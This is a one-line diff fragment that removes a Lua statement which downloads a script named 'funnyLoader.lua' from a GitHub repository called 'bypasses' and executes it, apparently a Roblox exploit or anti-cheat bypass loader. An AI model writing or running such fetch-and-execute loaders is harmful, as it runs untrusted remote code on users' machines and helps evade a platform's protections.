@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sunkenball/bypasses/main/funnyLoader.lua"))()
